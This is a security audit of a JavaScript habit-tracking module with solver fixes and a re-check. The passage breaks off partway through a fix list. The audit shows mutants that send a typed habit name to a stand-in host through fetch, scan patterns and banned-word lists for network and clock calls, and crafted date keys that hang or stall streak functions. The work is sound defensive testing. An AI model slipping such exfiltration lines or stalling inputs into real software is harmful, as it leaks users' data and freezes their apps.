---
module: habit-logic
kind: security
status: pass
counts: { critical: 0, high: 0, medium: 0 }
# Re-check 2, 2026-10-09 at 4e803c5: SEC-01 and SEC-04 closed, no new finding. Re-check 1 at a35e8aa read status issues_found, counts { critical: 0, high: 0, medium: 2 }.
# Re-check 2026-10-09 at a35e8aa: SEC-01 reopened, SEC-02 and SEC-03 closed, SEC-04 new. The first audit at 59c6ee5 read counts { critical: 0, high: 0, medium: 3 }.
---
# Security audit, habit-logic

> Written by the security finder (read-only), 2026-10-09, against commit `59c6ee5` on `main`. Scope is `src/dates.js`, `src/habits.js` and `tests/`. Judged against the Threat model in `spec.md` (with its dated corrections, including the WR-03 note on the Object integrity row), `docs/constitution.md` and `CLAUDE.md`, with the app's storage contract and threat model in `docs/modules/app/spec.md` as the context for stored, user-controlled input. Line numbers are as of `59c6ee5`. Each finding also names the symbol.

## Verdict

**FAIL (issues_found). 0 CRITICAL, 0 HIGH, 3 MEDIUM.** No exploitable vulnerability was found. All seven threat-model mitigations are present and held up under hostile input. The three MEDIUM findings are defence-in-depth gaps. Two are weak controls inside rows of the threat model (SEC-02, SEC-03). One is a threat the model does not name (SEC-01).

## Evidence

All files are in `docs/modules/habit-logic/qa/security/20261009T115752/`. Each probe script writes its `.txt` output next to itself.

- `baseline-full-suite.txt`. `node --test "tests/**/*.test.js"` from the project root, Node v24.11.1 on win32. 61 tests, 61 pass, 0 fail, exit 0.
- `probe-proto-and-keys.mjs` / `.txt`. Prototype pollution and unknown keys, with negative controls. 0 failures.
- `probe-mutation.mjs` / `.txt`. Proxy write traps on every argument of every export, alias walk, shared-result checks. 0 failures. A positive control recorded the writes of an in-place sort.
- `probe-strings.mjs` / `.txt`. Hostile and oversized strings through `isDateKey` and `validateName`, with time and heap figures.
- `probe-history.mjs` / `.txt`. Large valid histories, up to quota size and beyond.
- `probe-unbounded-loops.mjs` / `.txt`. Keys outside the `isDateKey` domain, each risky call in a child process capped at 5 s with SIGKILL.
- `probe-global-and-egress.mjs` / `.txt`. Runtime traps on network, clock, random, timers and locale, a global-object diff and an environment diff. Positive controls fired. 0 failures.
- `make-mirrors.mjs` / `.txt`, `mirrors/<name>/` and `mirror-run-<name>.txt`. Each mirror is a throwaway copy of `src/`, `tests/` and the sample fixture with one planted change, run with the full suite.
- `probe-scan-patterns.mjs` / `.txt`. Checks the scan patterns proposed in SEC-03 against the real source, the mirrors and short synthetic lines.
- `probe-notes.mjs` / `.txt`. Edges recorded under Observations.
- `capture.mjs` is the capped runner the suite runs used.

The mirrors contain deliberate mutants that use `fetch("https://collector.invalid/...")`, `sessionStorage`, `new Date` and `Date()`. They sit outside `src/` and outside the test glob, and nothing imports them. A repo-wide grep will still find them.

## Threat model mitigations, row by row

| Row (asset) | Required mitigation | Where it lives | Result |
|---|---|---|---|
| The day the user sees as "today" | Local getters (R1), calendar arithmetic (R3), tests under `Asia/Kuala_Lumpur` and `America/New_York` | `localDateKey` uses `getFullYear`, `getMonth` and `getDate` (`src/dates.js:76-78`). `addDays` uses integer day counts (`daysFromCivil`, `civilFromDays`) and never adds milliseconds. The test "@R3 agrees with UTC reference maths for every day 1900 to 2100 in both zones" passes, and so does the zone-switch precondition test. | **PASS** |
| Deterministic, testable results | `todayKey` is always an argument. R16 scans for clock reads. | Every function takes `todayKey`. At run time the traps recorded 0 calls to `new Date()`, `Date.now`, `Date()`, `performance.now`, `Math.random` or any timer, across the import and three rounds of every export, and all three rounds gave identical results. The scan exists but misses common forms (SEC-03). | **PASS for the code. The scan is weak, see SEC-03.** |
| English copy | Fixed tables (R4). R16 scans for `Intl` and `toLocale`. | `WEEKDAYS` and `MONTHS` tables. The runtime traps recorded 0 `Intl` or `toLocale*` calls. "@R4 labels do not follow the runtime locale" first proves the child's default locale is German, then checks the labels. | **PASS** |
| Responsiveness with tampered stored data | Only the anchored linear `^\d{4}-\d{2}-\d{2}$`. Name length counted in one linear pass. No other regular expression on stored data. | `KEY_PATTERN` (`src/dates.js:10`) has no `g` or `y` flag, so it keeps no `lastIndex` state. It rejected 7 hostile shapes in 0.000 to 0.004 ms at every length from 10^4 to 5x10^7 characters, so its time does not grow with length. `parseKey` splits on a string, not a pattern. No other regular expression exists in `src/`. The name count is linear in time but copies the whole name into an array first (SEC-02). | **Pattern: PASS. Name count: weak, see SEC-02.** |
| The app's in-memory state | Pure functions return new arrays (R16, frozen-input tests). | Every array and object argument of every export, wrapped in write-trapping Proxies: 0 writes, and no input object appears in any result. `localDateKey` leaves the Date's `getTime()` and own keys as they were. Changing a returned value never changes a later result. Namespace exports cannot be assigned or deleted. | **PASS** |
| The app's invariants (12 habits, valid unique names, last 7 days only) | `addHabit` checks the limit, then the name (R14). `toggleDay` refuses dates outside the window (R9). | `addHabit` returns `limit` at 12 and 13 habits even for an empty or duplicate name. `toggleDay` uses `weekWindow(todayKey).includes(dateKey)` and strict `position === index`, so out-of-window dates and the indexes `"0"`, 99, -1, 0.5, `NaN` and `undefined` change nothing (tests and `probe-mutation.txt`). | **PASS** |
| Object integrity | `{ name, done }` literals. No `Object.assign`, no spread of objects whose keys come from data (WR-03 correction). | `copyHabit`, `toggledHabit` and `addHabit` build literals. The only spreads are array spreads (`src/habits.js:33`, `:101`, `:234`). Parsed habits carrying `__proto__`, `constructor`, `prototype` and an extra key come out of `toggleDay`, `deleteHabit` and `addHabit` with own keys exactly `done,name` and `Object.prototype` as prototype. `Object.prototype`, `Array.prototype` and `Function.prototype` are unchanged, and `({}).polluted` is undefined. Negative controls on the same input: spread carried all four unknown keys, and `Object.assign` swapped the prototype. Names and `done` entries such as `__proto__` and `constructor` are counted through a `Map` and arrays, never as object keys. `isDateKey` never converts an object to text, so a hostile `toString` or Proxy is never touched. | **PASS** |

Network and global state (the brief asked for this. The threat model has no row for it). Traps on `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `Request` and `navigator.sendBeacon` recorded 0 calls. No property was added to `globalThis`, and `process.env` was unchanged. `habits.js` imports only `./dates.js`, and `dates.js` imports nothing. **PASS at run time.** The source scan cannot catch a future network or storage call (SEC-03).

## CRITICAL

None.

## HIGH

None.

## MEDIUM

### SEC-01: The streak walks have no bound, so two out-of-domain keys make `bestStreak` loop forever
- **File:** `src/habits.js:37-41` (`runLength`, used by `currentStreak` and `bestStreak`), with `src/dates.js:20-31` (`pad`, `formatKey`, `parseKey`) under `addDays` · **Boundary:** stored `done` array → app `decodeState` → `bestStreak` / `currentStreak` → the `runLength` loop
- **Threat:** `runLength` loops while `days.has(key)` and trusts `addDays` to reach a new key on every step. Outside the `isDateKey` domain, `addDays` can return the same key twice, so the walk never ends:
  - Past 2^53 days, floating-point rounding makes +1 a fixed point. `bestStreak(["24660873954866-12-02", "24660873954866-12-04"])` never returned. Neither did the same call with three valid keys added. Each child was killed after 5 s. The first key starts a run, because its previous day `24660873954866-11-30` is absent, and the second key is its own next day.
  - Below year 0001, `pad` writes year -1 as `"00-1"`, and `parseKey` reads `"00-1-12-31"` back as year 0, month 1, day 12. Walking back from `0000-01-01` therefore enters a 12-key cycle. `currentStreak(<that chain>, "0000-01-03")` never returned. Neither did `currentStreak` over 800,000 days back from 2026-10-08, which is how this audit's own first history probe hung (it was killed by its 400 s cap).

  Every key that causes a hang fails `isDateKey`. The same 800,000 keys filtered by `isDateKey` first return in 1.3 s (739,897 keys). The decoder contract (app spec, readable rule 5) therefore closes this path today. If the path ever opens, the effect is severe and lasting. The app computes `bestStreak` for every row at boot, so the tab hangs on every load and the user never reaches a control that could recover. The R17 reset note never appears either, because decoding succeeded. Precondition: a key that fails `isDateKey` reaches this module, through a decoder defect or a later caller that passes undecoded data. That is not reachable through the current contracts, so this is MEDIUM and not HIGH. `currentStreak`, `runContinues`, `heatmapCells` and `toggleDay` all returned normally with the 2^53 keys present.
- **Maps to spec threat:** NEW, not in the threat model. The "Responsiveness" row covers regular-expression backtracking only. BUILD.md records "`addDays` past year 9999 or before year 0001 returns a key that `isDateKey` rejects" as an unspecified edge, but not the non-terminating loop it leads to.
- **Fix:** Bound the walk by the set's size, because a run can never be longer than the number of distinct days: `for (let key = from; length < days.size && days.has(key); key = addDays(key, step)) length++;`. On the inputs that hang, the bounded form returns 2 and 12 (`probe-unbounded-loops.txt`, section 3). Add a test for the two-key input and for the year-0 chain, each in a child process with a timeout, so that a regression fails the test instead of hanging the runner. For the orchestrator, add a dated threat-model row: "A key outside the `isDateKey` domain makes a streak walk loop forever. Mitigation: each walk is bounded by the number of distinct days."

### SEC-02: The name length check copies the whole name into an array, up to 17 times the name's size in memory
- **File:** `src/habits.js:215` (`validateName`, `Array.from(name).length > MAX_NAME_LENGTH`) · **Boundary:** stored habit name → app `decodeState` (readable rule 4) → `validateName`
- **Threat:** The threat-model mitigation says "Name length is counted in one linear pass". That holds for time. With 5,000,000 UTF-16 units it took 27 ms for ASCII, 184 ms for CJK and 78 ms for emoji. But `Array.from` builds one string per code point before the length is read. For a 5,000,000-unit name, about the per-origin storage quota, the heap grew by 42.9 MiB for ASCII, 161.4 MiB for CJK (from a 9.5 MiB string) and 104.9 MiB for emoji (`probe-strings.txt`). A page on the same origin, an extension or a manual edit can plant such a name. The decoder runs `validateName` on it at load, before the value is found too long and the state is reset. On a device with a small heap limit, this spike on top of `JSON.parse` of a 10 MB string could end the tab. If that happens before the R17 reset save, the next load repeats it. Crash behaviour on a phone was not measured (UNVERIFIED). The heap figures were measured in Node.
- **Maps to spec threat:** Yes, the row "Responsiveness with tampered stored data" (the mitigation's "one linear pass"). App T8 accepts linear parsing time. It does not cover a memory spike this large.
- **Fix:** Count code points with an early exit, for example `function longerThan(text, limit) { let count = 0; for (const _ of text) if (++count > limit) return true; return false; }`, then `if (longerThan(name, MAX_NAME_LENGTH)) return { ok: false, error: "too-long" };`. It counts code points through the same string iterator `Array.from` uses, so the CG-8 rule does not change. On the same three 5,000,000-unit inputs it took 0.002 to 0.003 ms and allocated 0.01 MiB. Keep the 1,000,000-character test and add a 5,000,000-unit emoji or CJK name with a time cap. For the orchestrator, add a dated note to the row: "counted in one pass that stops after 41 code points".

### SEC-03: The R16 source scan misses common clock reads and every network and storage call
- **File:** `tests/purity.test.js:24-29` ("@R16 the source has no clock read, even in a comment") and `tests/purity.test.js:31-37` ("@R16 the code has no DOM, storage, global or locale access"). The patterns come from spec R16. · **Boundary:** the text of `src/dates.js` and `src/habits.js` → the purity gate that keeps the module free of clock and I/O
- **Threat:** For the "Deterministic" row, the threat model's control is "R16 scans the source for clock reads". The scan matches the text `Date.now(` and the pattern `/new\s+Date\s*\(\s*\)/`. It misses `new Date` without parentheses, which is legal JavaScript and reads the same clock, and `Date()` called as a function. The banned-word list is `document`, `window`, `localStorage`, `globalThis`, `Intl` and `toLocale*`. It leaves out `fetch`, `XMLHttpRequest`, `WebSocket`, `navigator` / `sendBeacon`, `sessionStorage`, `indexedDB`, timers, `performance.now` and `Math.random`. Mirror runs of the full suite (61 tests):
  - control, `currentStreak(done, todayKey = localDateKey(new Date()))`: **red**, 60 pass and 1 fail, the clock test.
  - `localDateKey(new Date)`: **61 of 61 green**.
  - `localDateKey(new Date(Date()))`: **61 of 61 green**.
  - In `addHabit`, `sessionStorage.setItem("streaks.last", raw)` plus a `fetch("https://collector.invalid/streaks", { method: "POST", body })` of the typed name: **61 of 61 green**.

  The current code contains none of these. That was confirmed by reading the source and by the runtime traps, which recorded 0 calls. So this is a regression guard that cannot fail for these forms, not a live defect. In the browser, the app's CSP `connect-src 'none'` would refuse a `fetch` (app T5). Nothing would stop a `sessionStorage` write or a clock read, and in the Node unit tests a `fetch` would actually run.
- **Maps to spec threat:** For clock reads, yes: the row "Deterministic, testable results" (weak control). For network and storage access it is NEW. The threat model states "This module has no I/O" but names no control that keeps it that way.
- **Fix:** In `tests/purity.test.js`, add these patterns to the whole-text clock check: `/\bnew\s+Date\b(?!\s*\(\s*[^\s)])/` (any `new Date` without arguments, with or without parentheses), `/(?<!\bnew\s+|[.\w$])Date\s*\(/` (`Date` called as a function) and `/\bperformance\s*\.\s*now\b|\bMath\s*\.\s*random\b/`. Add this pattern to the code-only check: `/\b(fetch|XMLHttpRequest|WebSocket|EventSource|navigator|sendBeacon|sessionStorage|indexedDB|caches|setTimeout|setInterval|setImmediate|queueMicrotask|requestAnimationFrame|self|process)\b/`. Measured in `probe-scan-patterns.txt`: none of them hits the real source. Each catches its mirror. The synthetic lines `new Date(2026, 9, 8)`, `new Date(key)` and `Date.UTC(...)` do not hit, while `new Date;`, `new Date( )` and `Date()` do. For the orchestrator, add a dated R16 note that lists the added patterns, and add "no network or storage call" to the module's threat model with this scan as its control.

## Observations (not filed, no severity)

- **Name characters.** `validateName` accepts names that are only invisible characters (U+200B, U+2060 with U+200C), an existing name plus U+200B, a Cyrillic homoglyph, the NFD form of an existing NFC name, U+202E (right-to-left override), C0 control characters, an embedded line break and a lone surrogate (`probe-notes.txt`). This meets the spec's rule exactly (trimmed, 1 to 40 code points, unique under `toLowerCase`). It gives no new power to an attacker. Anyone who can plant storage can already write any name or wipe the data, and a typed name affects only the person typing it. Names reach the DOM only through `textContent` and `setAttribute` (app R24). Whether to reject format and control characters, or to NFC-normalize before the duplicate check, is a product decision for the orchestrator. It is not a security defect.
- **Key format above year 9999.** `localDateKey(new Date(10000, 0, 1))` gives `"10000-01-01"`, which `isDateKey` rejects. If the device clock were set to year 10000 or later, a tick would save a key that the next load treats as unreadable, and the whole state would be reset. The precondition is not realistic. Noted for the app spec.
- **Large valid histories.** Every function is linear. A quota-sized history (400,000 consecutive valid days, 5.2 MB of JSON) takes 230 ms for `currentStreak` and 398 ms for `bestStreak`. Spread over 12 habits, one full render takes 579 ms and one tick 576 ms on this desktop, and a phone will be slower. One million duplicates cost 4 ms. App T8 accepts linear parsing cost. Its scope could name the cost of each render after a planted history as well. This is not a habit-logic defect.
- **Legacy RegExp statics.** After a successful `isDateKey`, `RegExp.lastMatch` and `RegExp.input` hold that 10-character key. A failing string, including one of 5,000,010 characters, is not kept. This is harmless.
- **Non-string input.** `validateName(null)` and calls with other non-strings throw `TypeError`. An object with a `trim` method passes duck typing. App readable rule 4 type-checks `name` as a string first, and the add form passes `input.value`, so neither path is reachable. BUILD.md already records this.
- **Tests.** No test writes files. The R4 locale test runs its child with `execFileSync` (no shell) and a 15 s timeout, and it builds the module URL with `JSON.stringify`, so no injection is possible. No credential-shaped string appears in `src/` or `tests/` (case-insensitive grep for api key, secret, token, password and bearer).

## Processes

PROCESSES: none alive. Every command ran in the foreground with a cap. Child processes started, all STOPPED at return:
- Six `node --test` runs through `capture.mjs`, each capped at 120 s: the baseline (pid 44460) and the five mirrors (pids 41596, 44692, 31612, 43852, 16944). All exited by themselves.
- `probe-unbounded-loops.mjs` children, capped at 5 s with SIGKILL. The hanging cases were killed by that cap. On the final run that was pids 40896 and 19148 (the two-key `bestStreak` cases) and 45976 and 13404 (the year-0 `currentStreak` cases). On the earlier run it was pids 45248 and 44100 (the same year-0 cases). The other children exited normally.
- The first `probe-history.mjs` run was killed by its 400 s shell `timeout` (the hang explained in SEC-01).

Sweep method: `tasklist /FI "IMAGENAME eq node.exe"` after each probe group and at the end listed no node process. At the end, a command-line sweep (`Get-CimInstance Win32_Process`) for `node.exe`, `bash.exe`, `sh.exe` or `cmd.exe` whose command line contains the evidence folder name, `probe-`, `capture.mjs` or `mirrors` found only the sweep's own shell. No server, browser, watcher or background shell was started.

## Solver (2026-10-09)

> Written by the security solver, 2026-10-09, on `main` from `59c6ee5`. The auditor's text above and its evidence folder are unchanged (read only). Solver evidence is in `docs/modules/habit-logic/qa/security-solver/20261009T123108/`. Phase skills: the registry assigns none to non-UI work, so none were loaded. The security finder should be re-run.

**Result: 3 of 3 RESOLVED, 0 STILL-OPEN.**

- Final run, `node --test "tests/**/*.test.js"` from the project root, Node v24.11.1 on win32, at `eb2003b`. 64 tests, 64 pass, 0 fail, exit 0 (`final-runs.txt`). The baseline at `59c6ee5` was 61. Added are two SEC-01 tests and one SEC-02 test in `habits.test.js` (now 37). SEC-03 changed two `purity.test.js` tests in place (still 5). `dates.test.js` 15 and `sample-history.test.js` 7 are unchanged.
- The final tests against the code before the fixes. `old-src-loader.mjs` serves the `59c6ee5` `habits.js` to every process, the suite's children included, without touching `src/`. The suite then gives 61 pass and 3 fail, exactly the three regression tests (`final-runs.txt`).
- Each commit's content ran green as a full suite before it was committed (63 of 63 before `add5043`, 64 of 64 before `e83acb4`, `3750d67` and `eb2003b`). The credential gate (`--staged`) passed before each commit, exit 0, with both of its controls.
- `eb2003b` corrects three comments and one helper name that the solver itself wrote in the SEC-01 and SEC-02 tests. Two of them stated something false: the stuck keys sit just below 2^53 days, not past it, and the app's decoder does not drop such a key, it treats the whole saved state as unreadable (app readable rule 5, R17).

| Finding | Status | Commit | Fix | Red, then green |
|---|---|---|---|---|
| SEC-01 | RESOLVED | `add5043` (test comments `eb2003b`) | `runLength` walks only while `length < days.size && days.has(key)`. A run can never hold more days than the set, so the walk ends even where `addDays` repeats a key. Its comment says why. | Red on the unfixed code. Both new tests failed when their child gave no result within 5 s, and the children (pids 31656 and 22148) were killed. Their preconditions held first: `addDays` of the stuck key is itself, and the 12 keys below year 0001 form a cycle. Green after the fix in 38 ms each. Valid input is unchanged. `differential.mjs streaks` compares the `59c6ee5` code with the fix on 81,706 cases (seeded random histories with gaps, duplicates and shuffled order, both ends of the valid range, 100,000 consecutive days, the sample on every day of 2026 and 2027) and finds 0 mismatches. Its control, with the bound planted one short, finds 6,109. `bounded-walks.mjs` reruns the audit's hanging inputs. The two-key `bestStreak` returns 2, the year-0 cycle returns 12, and the 800,000-day history returns in 0.9 s (`sec01-runs.txt`). |
| SEC-02 | RESOLVED | `e83acb4` (test name and comment `eb2003b`) | `validateName` checks length with a new private `longerThan(text, limit)`. It counts code points with `for...of` over the string iterator, the same iterator `Array.from` uses, and returns at the 41st. | Red on the unfixed code. The new test counts the steps the check takes through string iterators, and `Array.from` took 5,000,001 steps on a 5,000,000 unit CJK name. The precondition held first (4 steps for `Array.from("abc")`). Green after the fix, at most 41 steps on 5,000,000 CJK units, 5,000,000 emoji units and 41 lone surrogates, and 40 lone surrogates are still accepted. Results are unchanged. `differential.mjs names` finds 0 mismatches on 51,202 cases (50,000 seeded random names mixing ASCII, white space that trim removes, CJK, a combining mark, astral emoji, lone high and low surrogates that pair up when adjacent, a zero-width space and a capital whose lower case changes length, plus every piece repeated 35 to 45 times, plus lone-surrogate names at the 40 and 41 edge). Its control, with `>=` planted for `>`, finds 841. On 5,000,000 unit names the check went from 20 to 117 ms and +38 to +153 MiB of heap to 0.002 to 0.004 ms and +0.00 MiB (`sec02-runs.txt`). |
| SEC-03 | RESOLVED | `3750d67` | In `tests/purity.test.js`, `CLOCK_AND_RANDOM_READS` is matched on the whole text and again on the code with comments removed, which also finds a read that a comment splits. It holds `Date.now` (with or without a call), `new Date` without an argument (with or without parentheses), `Date` called as a function, `performance.now` and `Math.random`. `BANNED_IN_CODE` is matched on the code only, as whole words. It holds `document`, `window`, `self`, `globalThis`, `navigator`, `process`, `localStorage`, `sessionStorage`, `indexedDB`, `caches`, `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `sendBeacon`, dynamic `import(`, `setTimeout`, `setInterval`, `setImmediate`, `queueMicrotask`, `requestAnimationFrame`, `crypto`, `Intl` and `toLocale*`. Each failure names the rule it broke. Each pattern matches everything the pattern it replaces matched, so the qa.md Then lines are still met. | `scan-mutants.mjs` runs the old scan (the `59c6ee5` test, byte-identical in every auditor mirror) and the new one, with `scan-hook.mjs` serving each mutant to the scan in memory. Old scan, 3 of the 4 auditor mirrors green (the finding reproduced) and only the `new Date()` control red. New scan, all 4 red and the unchanged baseline green. On 22 further one-line mutants (`new Date;`, `Date()`, `Date.now`, `new Date(/* today */)`, `performance.now()`, `Math.random()`, `crypto.randomUUID()`, `fetch`, `sessionStorage`, `localStorage`, `indexedDB`, `caches`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `navigator.sendBeacon`, dynamic `import(`, `setTimeout`, `queueMicrotask`, `process.env`, `self` and `new Date( )`), the old scan stays green on 19 and the new scan is red on all 22. The new scan stays green on the real source and on added lines with `new Date(2026, 9, 8)`, `new Date(key)`, `new Date("2026-10-08")`, `Date.UTC(2026, 0, 1)` and a comment that names banned words (`sec03-runs.txt`). |

### Residuals, stated, not filed
- SEC-01. On keys outside the valid range the walk now ends, but its count is not meaningful. The stuck key is counted again until the set size is reached, so three valid keys plus the two stuck keys give `bestStreak` 5. No valid input gets there, as the differential shows, and the app's decoder rejects such data first.
- SEC-02. For a `raw` whose own `trim` method returns a non-iterable array-like with a `length` above 40, the old code returned `too-long` and the new code throws `TypeError`. This is outside the contract (`raw: string`), and app readable rule 4 type-checks the name as a string first, so no caller reaches it. For every string the results are the same.

### For the orchestrator (spec, qa and BUILD.md are yours, none were edited here)
- spec.md threat model. Add the SEC-01 row the auditor wrote, with `runLength` as its control. Add to "Responsiveness" that the name is counted in one pass that stops after 41 code points (`longerThan`). Add "no network or storage call" with the R16 scan as its control.
- spec.md R16 and qa.md's R16 scenario name only `Date.now(`, `/new\s+Date\s*\(\s*\)/` and the five old words. The tests now check the superset listed in the SEC-03 row. A dated note should list it.
- spec.md R13 still states the rule as `Array.from(name).length > 40`. The rule is unchanged, but the code now counts with `longerThan`, which a dated note could say.
- BUILD.md gives per-file counts of `habits.test.js` 34 and a 61 total. They are now 37 and 64.

### What changed, by symbol (for the README reconcile)
- `src/habits.js`: `runLength` (bounded walk, comment), new private `longerThan` (comment), `validateName` (calls `longerThan`). No export, signature or contract changed.
- `tests/habits.test.js`: new helpers `streakInChild` and `iteratorSteps`. New tests "@R7 the best-run walk ends on keys outside the valid range, where the next day repeats itself", "@R6 the current-run walk ends on the cycle below year 0001" and "@R13 the length check reads at most 41 code points, so a huge stored name costs no more than a short one".
- `tests/purity.test.js`: new tables `CLOCK_AND_RANDOM_READS` and `BANNED_IN_CODE`. Two tests renamed: "@R16 the source has no clock read, even in a comment" is now "@R16 the source has no clock or random read, even in a comment", and "@R16 the code has no DOM, storage, global or locale access" is now "@R16 the code has no DOM, storage, network, timer, global or locale access".

### Processes
PROCESSES: none alive. Every command ran in the foreground with a cap. No server, browser, watcher or background shell was started.
- Suite runs, each through `run-capped.mjs` (120 s cap) under a shell `timeout`. All exited by themselves. Their recorded child pids are in the run files.
- Children that the new SEC-01 tests started and that were killed at their 5 s cap: pids 31656 and 22148 (red run before the fix) and 37680 and 45104 (final tests against the `59c6ee5` code). `tasklist` showed 31656 and 22148 gone afterwards.
- Probe children all exited by themselves. These are `differential.mjs` (six runs, one `git show` each), `bounded-walks.mjs` (one run, eight children capped at 5 s), `scan-mutants.mjs` (six runs, 65 children per run, each capped at 60 s) and `old-src-loader.mjs` (one `git show` per process that loaded it).
- Two runs outside `run-capped.mjs` also exited by themselves. One is a hand debug run of `tests/purity.test.js` with the scan hook (shell `timeout 60`). The other is an inline `node -e` check of where the stuck keys sit against 2^53.
- The credential gate, `python -B credential_sweep.py --staged`, four times in the foreground. Each exited 0.

Sweep at 12:44, after the last run. `Get-CimInstance Win32_Process` listed every `node`, `bash`, `sh`, `cmd`, `python`, `pwsh` and `powershell` process with its parent, start time and command line. A second pass matched command lines on this run's folder name, its script names, `credential_sweep`, `--test` and `--input-type=module`. `tasklist` checked `node.exe` and `python.exe`. Result: no `node` or `python` process alive. The only matches were the sweep's own `bash` and `powershell`, started at 12:44:44. Three bare `powershell.exe` processes (39064, 37820, 25804) are children of `claude.exe` (41972) and were started at 11:22, 11:49 and 12:19, before this run began at 12:31. They are not the solver's and were left alone.

## Re-check (2026-10-09)

> Written by the security finder (read-only), 2026-10-09, against `a35e8aa` on `main`. The commits since the first audit are the solver's fixes `add5043` (SEC-01), `e83acb4` (SEC-02), `3750d67` (SEC-03) and `eb2003b` (test comments), and the documentation commits `f89e699` and `a35e8aa`. Evidence is in `docs/modules/habit-logic/qa/security/20261009T124854/`. The first audit's text and the Solver section above are unchanged. The counts in the front matter were updated in place to this re-check, and a dated YAML comment there keeps the first audit's counts. Line numbers are as of `a35e8aa`.

### Verdict

**FAIL (issues_found). 0 CRITICAL, 0 HIGH, 2 MEDIUM.**

- **SEC-02 and SEC-03 are CLOSED.**
- **SEC-01 is REOPENED.** The size bound ends each walk. But `bestStreak` starts one walk per run start, so many out-of-domain starts that lead into one stuck key cost about n squared steps. A stored value of 0.6 MB of such keys still stalls the thread for minutes.
- **SEC-04 is NEW.** The widened clock table misses `Temporal.Now`.

Neither open finding is reachable through the current contracts. Both are defence-in-depth gaps of the same kind as the first round.

The full suite at `a35e8aa` passes 64 of 64, exit 0 (`baseline-full-suite-HEAD.txt`).

### Per finding

| Finding | Status | Evidence |
|---|---|---|
| SEC-01 | **REOPENED** (MEDIUM) | Every input that hung in the first audit now returns (`probe-sec01-recheck.txt`, part A): the two-key `bestStreak` gives 2, the year-0 chain `currentStreak` gives 12, and the 800,000-day `currentStreak` gives 740,264 in 0.85 s. The threat behind the finding, a stall on every load, is still reachable with the same precondition. See below. |
| SEC-02 | **CLOSED** | At `a35e8aa`, `validateName` on 5,000,000-unit names takes 0.108 ms (ASCII), 0.013 ms (CJK) and 0.007 ms (emoji), with heap +0.01 MiB each. The `59c6ee5` code, loaded into the same process, takes 26 to 126 ms and +43.0 to +162.1 MiB. 15 edge strings give the same result as `59c6ee5`: lone surrogates, surrogate pairs in both orders, combining marks, zero-width characters and padding (`probe-sec02-recheck.txt`). |
| SEC-03 | **CLOSED** | The first audit's mirrors were rebuilt from `a35e8aa` (`mirror-run-*.txt`). Baseline is 64 of 64 green. The control `new Date()` is red. `new Date` is red ("habits.js text: new Date without an argument"). `new Date(Date())` is red ("Date called as a function"). The `fetch` plus `sessionStorage` mirror is red ("habits.js: storage"), and the network pattern also catches the `fetch` line alone (`probe-scan-hunt.txt`). No pattern hits the real source. |
| SEC-04 | **NEW** (MEDIUM) | See below. |

### Threat-model rows added or changed on 2026-10-09, checked against the code

| Row | What it claims | Matches the code |
|---|---|---|
| Deterministic, testable results (SEC-03 note) | The scan finds `new Date` without parentheses, `Date()`, `Date.now` without a call, `performance.now` and `Math.random`, through the table `CLOCK_AND_RANDOM_READS`. | **Yes.** `tests/purity.test.js:27-33` holds exactly these five, matched on the full text and on the code alone (the test at `:46`). It does not cover `Temporal.Now` (SEC-04). |
| Responsiveness with tampered stored data (SEC-02 note) | One pass that stops after 41 code points (`longerThan`), so a stored name of any size costs no more than a short one. | **Yes.** `longerThan` (`src/habits.js:213`) is called at `:230`. Measured above. |
| Responsiveness with date keys outside the valid range (new row) | "Each walk is bounded by the number of distinct days ... The bound holds if one gets through." The threat it names is that the tab hangs on every load. | **No.** Each walk is bounded, but the total work of `bestStreak` is not (SEC-01, reopened). The row's other claim holds: readable rule 5 keeps such keys out today (0 of 20,000 spellings pass `isDateKey`). |
| No network or storage call (new row) | The R16 scan bans each such call (`BANNED_IN_CODE`). | **Yes.** `tests/purity.test.js:36-44` holds the 24 words the R16 note lists, matched on the code only (the test at `:56`). The egress mirror is red. |
| R16 note, qa.md R16 note, R13 note, BUILD.md counts | The new tables and their scope, and the test counts. | **Yes.** The lists match the tables word for word. BUILD.md's 64 tests (15, 37, 7 and 5) match the run at `a35e8aa`. |

### MEDIUM

#### SEC-01 (REOPENED): The bound ends each walk, but `bestStreak` still takes about n squared steps on out-of-domain keys
- **File:** `src/habits.js:75-82` (`bestStreak`, one `runLength` walk per run start), with `src/habits.js:41-45` (`runLength`, bounded by `length < days.size`) and `parseKey` in `src/dates.js` (reads each part with `Number()`) · **Boundary:** stored `done` array → app `decodeState` → `bestStreak` → one bounded walk per run start
- **Threat:** `parseKey` reads each part of a key with `Number()`, which ignores white space around the digits. So the date 24660873954866-12-02 has thousands of distinct spellings, for example `"24660873954866-12- 02"` or the same key with U+3000 before `12`. Each spelling is a separate key in the Set, and all of them share the same previous day, which is absent. So each spelling starts its own run. Each one's next day is the stuck key `24660873954866-12-04`, whose next day is itself. With n spellings plus the stuck key, every start walks until the bound stops it at n + 1 days, so `bestStreak` takes about n squared steps.
  - Measured in capped child processes: 500 keys took 0.13 s, 1,000 took 0.52 s, 2,000 took 2.05 s and 4,000 took 8.07 s, four times longer for each doubling.
  - 20,000 keys, a stored value of 527,576 UTF-16 code units (633 KB of UTF-8), gave no result in 60 s, and the child (pid 17536) was killed.
  - 90,000 keys still fit in the quota (2.4 million code units, 3.0 MB). On the measured curve they would take about 68 minutes.
  - `currentStreak` makes one walk and returns in 12 ms on the same 20,000 keys.

  The precondition and the impact are those of the first round. The app computes `bestStreak` for every row at boot, so the tab would stall on every load. Every spelling fails `isDateKey` (0 of 20,000 pass), so app readable rule 5 still closes the path today. The new threat-model row says the bound holds "if one gets through". For this input, that claim is false. The count on such input is also not meaningful, as the Solver section notes: three valid keys plus the two stuck keys give 5. My first-round fix advice (the size bound) was incomplete, and this re-check corrects it.
- **Maps to spec threat:** Yes. It is the row "Responsiveness with date keys outside the valid range" (added 2026-10-09). Its mitigation is incomplete.
- **Fix:** Make the total work linear, not each walk. Two shapes were measured in `probe-sec01-recheck.txt` part C (90,000 spellings plus the stuck key) and in `probe-fix-shapes.txt` (400,000 valid days, the quota-sized case).
  - **(a)** Drop keys that fail `isDateKey` before walking: `const days = new Set(done.filter(isDateKey));` in `currentStreak` and `bestStreak`. `isDateKey` is already exported by `./dates.js`. Inside the valid range, `addDays` never repeats a key, and a walk ends where it leaves the range, so each run is walked once. On the attack input the result is 0 in 3 ms. On valid input it costs 511 ms against `a35e8aa`'s 421 ms.
